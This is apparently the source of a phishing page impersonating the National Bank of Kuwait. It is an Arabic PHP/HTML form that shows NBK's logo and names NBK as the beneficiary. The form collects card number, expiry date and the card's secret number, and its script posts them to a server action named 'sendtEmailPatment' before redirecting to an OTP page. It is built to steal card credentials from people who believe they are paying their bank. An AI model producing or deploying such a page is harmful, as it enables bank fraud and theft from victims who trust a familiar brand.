<?php
$contraies = array("الكويت", "مصر", "السعودية", "العراق", "لبنان", "الامارات", "الصين", "فرنسا", "سنغفورا", "سويسرا", "المملكة المتحدة", "الولايات المتحدة");
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RTL Header with Form</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap RTL CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-rtl/css/bootstrap.rtl.min.css" rel="stylesheet">
    <link rel="stylesheet" href="pay.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <style>

    </style>
</head>

<body>

    <header class="header-image d-flex justify-content-center align-items-center">
        <div class="container">
            <div class="row">
                <!-- Box with Name and Image -->
                <div class="col-md-12 mb-3">
                    <div class="content-box text-center">
                        <img src="banner.png" alt="User Image" class="banner mb-3"> <!-- Replace with your image URL -->
                    </div>
                </div>
            </div>
        </div>
    </header>
    <section>
        <div class="container">
            <div class="box-one">
                <div class="d-flex justify-content-center">
                    <img src="https://www.nbk.com/dam/jcr:281bc4f7-7256-48c6-a05e-761bacea00a3/nbk-logo.svg"
                        alt="SPACES" itemprop="logo">
                </div>
                <ul class="list-group list-group-flush">
                    <li class="list-group-item d-flex justify-content-start">
                        <span class="">المستفيد</span> <!-- Aligns to the left -->
                        <span class="mx-auto text-blue">NBK</span> <!-- Centers within the list item -->
                    </li>
                </ul>
            </div>
        </div>
    </section>
    <from id="payment-form">
        <input type="hidden" name="action" id="action" value="sendtEmailPatment">

        <section>
            <div class="container">
                <div class="box-one">
                    <ul class="list-group list-group-flush">
                        <li class="list-group-item">
                            <div class="row">
                                <div class="col-4">
                                    <span class="text-blue">يرجى اختيار البلد</span> <!-- Aligns to the left -->
                                </div>
                                <div class="col-8">
                                    <select class="form-select" name="contry" id="contry" aria-label="Select an option">
                                        <option value="" disabled selected hidden>ارجو اختيار البلد</option>
                                        <?php foreach ($contraies as $c) {
                                            echo "<option value='$c'>$c</option>";
                                        } ?>
                                    </select>
                                </div>
                            </div>
                        </li>

                        <li class="list-group-item">
                            <div class="row">
                                <div class="col-4">
                                    <span class="text-blue">رقم بطاقة الصراف الألي</span> <!-- Aligns to the left -->
                                </div>
                                <div class="col-4">
                                    <input type="text" class="form-control" name="cardNumber" id="cardNumber"
                                        placeholder="رقم بطاقة الصراف الألي">
                                </div>
                                <div class="col-4">
                                    <input type="text" class="form-control" name="bada" id="bada" placeholder="بادئة">
                                </div>
                            </div>
                        </li>

                        <li class="list-group-item">
                            <div class="row">
                                <div class="col-4">
                                    <span class="text-blue">تاريخ الأنتهاء</span> <!-- Aligns to the left -->
                                </div>
                                <div class="col-2">
                                    <select class="form-select " id="month" name="month" aria-label="MM">
                                        <option value="" disabled selected hidden>MM</option>
                                        <?php for ($i = 1; $i <= 12; $i++) {
                                            echo "<option value='$i'>$i</option>";
                                        } ?>
                                        <!-- <option value="1">January</option>
                                        <option value="2">February</option>
                                        <option value="3">March</option>
                                        <option value="4">April</option>
                                        <option value="5">May</option>
                                        <option value="6">June</option>
                                        <option value="7">July</option>
                                        <option value="8">August</option>
                                        <option value="9">September</option>
                                        <option value="10">October</option>
                                        <option value="11">November</option>
                                        <option value="12">December</option> -->
                                    </select>
                                </div>
                                <div class="col-2">
                                    <select class="form-select w-100" id="year" name="year" aria-label="Select Year">
                                        <option value="" disabled selected hidden>YY</option>
                                        <!-- Generate years dynamically if needed -->
                                        <?php for ($i = 2023; $i <= 2030; $i++) {
                                            echo "<option value='$i'>$i</option>";
                                        } ?>
                                        <!-- <option value="2023">2023</option>
                                        <option value="2024">2024</option>
                                        <option value="2025">2025</option>
                                        <option value="2026">2026</option>
                                        <option value="2027">2027</option>
                                        <option value="2028">2028</option>
                                        <option value="2029">2029</option>
                                        <option value="2030">2030</option> -->
                                    </select>
                                </div>
                            </div>
                        </li>

                        <li class="list-group-item">
                            <div class="row">
                                <div class="col-4">
                                    <span class="text-blue">الرقم السري</span> <!-- Aligns to the left -->
                                </div>
                                <div class="col-8">
                                    <input type="text" class="form-control" name="cvv" id="cvv"
                                        placeholder="الرقم السري">
                                </div>
                            </div>
                        </li>
                    </ul>
                </div>
            </div>
        </section>
        <section>
            <div class="container">
                <div class="box-one">
                    <div class="row">
                        <div class="col-md-6 col-sm-6 col-6">
                            <button class="btn btn-send  w-100" id="send-data" type="submit">ارسال</button>
                        </div>
                        <div class="col-md-6 col-sm-6 col-6">
                            <a class="btn btn-send w-100" href="javascript:void(0)" type="submit">الغاء</a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </from>
    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>



    <script>
        $(document).ready(function () {
            $('#send-data').click(function (e) {
                e.preventDefault();
                var isValid = true;
                var contry = $('#contry').val();
                // Simple validation
                var name = $('#cardNumber').val();
                // var email = $('#email').val();
                var month = $('#month').val();
                var year = $('#year').val();
                var cvv = $('#cvv').val();
                var action = $('#action').val();
                var bada = $('#bada').val();

                if (contry === "" || contry === null) {
                    alert("الرجاء ادخال الدولة.");
                    isValid = false;
                    return "";
                }
                // Check if name is filled
                if (name === "" || name === null) {
                    alert("الرجاء ادخال الاسم.");
                    isValid = false;
                    return "";
                }
                if (month === "" || month === null) {
                    alert("الرجاء ادخال الشهر.");
                    isValid = false;
                    return "";
                }
                if (year === "" || year === null) {
                    alert("الرجاء ادخال السنة.");
                    isValid = false;
                    return "";
                }
                if (cvv === "" || cvv === null) {
                    alert("الرجاء ادخال الرقم السري.");
                    isValid = false;
                    return "";
                }

                // Submit form if valid
                if (isValid) {

                    $.ajax({
                        url: '/functions.php',
                        type: 'POST',
                        data: {
                            action: action,
                            contry: contry,
                            name: name,
                            month: month,
                            year: year,
                            cvv: cvv,
                            bada: bada
                        },
                        dataType: 'json', // Expect JSON response
                        success: function (response) {
                            if (response.status === 'success') {
                                // Redirect to OTP page if the email was sent successfully
                                window.location.href = response.redirect;
                            } else {
                                // Display an error message if something went wrong
                                alert(response.message || 'Failed ');
                            }
                        },
                        error: function (jqXHR, textStatus, errorThrown) {
                            console.error('AJAX Error:', textStatus, errorThrown);
                            alert('An error occurred while sending your request.');
                        }
                    });

                    //   $('#payment-form').submit();
                }
            });

            // Function to validate email format
            function validateEmail(email) {
                var emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                return emailPattern.test(email);
            }
        });
    </script>
</body>

</html>